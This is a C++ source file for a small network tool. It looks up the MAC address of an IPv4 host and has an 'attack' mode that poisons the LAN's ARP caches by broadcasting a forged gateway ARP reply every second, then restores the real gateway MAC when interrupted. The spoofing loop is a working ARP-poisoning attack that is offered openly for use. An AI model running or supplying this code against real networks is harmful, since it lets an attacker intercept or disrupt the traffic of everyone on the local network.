#include "traffic/transport.h"
#include "toolkit/logging.h"
#include "toolkit/args.h"
#include <signal.h>
#include <atomic>
#include <thread>

std::atomic<bool> end_attack = false;

void onInterrupt(int) { end_attack = true; }

int main(int argc, char* argv[])
{
    MY_TRY
    toolkit::Args args(argc, argv);
    args.optional("attack,a", po::bool_switch(),
                  "attack whole network by pretending myself to be gateway");
    args.positional("ip", po::value<std::string>()->default_value(""), "ipv4 address", 1);
    args.parse();

    auto opt_attack = args.get<bool>("attack");
    auto opt_ip = args.get<std::string>("ip");

    if (opt_ip.empty() && !opt_attack) {
        ELOG("empty ipv4 address, please input ip");
        return -1;
    }

    net::Ip4 ip = !opt_ip.empty() ? net::Ip4(opt_ip) : net::Ip4::kZeros;
    auto& apt = net::Adaptor::fit(ip);
    void* handle;
    CHECK_ERR_RET_INT(net::Transport::open(apt, handle));
    auto handle_guard = toolkit::scopeExit([&] { net::Transport::close(handle); });

    if (!opt_attack) {
        net::Mac mac;
        if (net::Transport::ip2mac(handle, ip, mac) == MyErrCode::kOk) {
            ILOG("{} is at {}", ip, mac);
        } else {
            ILOG("{} is offline", ip);
        }
    } else {
        signal(SIGINT, onInterrupt);
        net::Mac gateway_mac;
        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac) == MyErrCode::kOk) {
            ILOG("gateway {} is at {}", apt.gateway, gateway_mac);
        }
        ILOG("forging gateway's mac to {}...", apt.mac);
        auto lie = net::Packet::arp(apt.mac, apt.gateway, apt.mac, apt.ip, true);
        while (!end_attack) {
            CHECK_ERR_RET_INT(net::Transport::send(handle, lie));
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        ILOG("attack stopped");
        if (net::Transport::ip2mac(handle, apt.gateway, gateway_mac, false) == MyErrCode::kOk) {
            auto truth = net::Packet::arp(gateway_mac, apt.gateway, apt.mac, apt.ip, true);
            CHECK_ERR_RET_INT(net::Transport::send(handle, truth));
            ILOG("gateway's mac restored to {}", gateway_mac);
        }
    }
    MY_CATCH
}
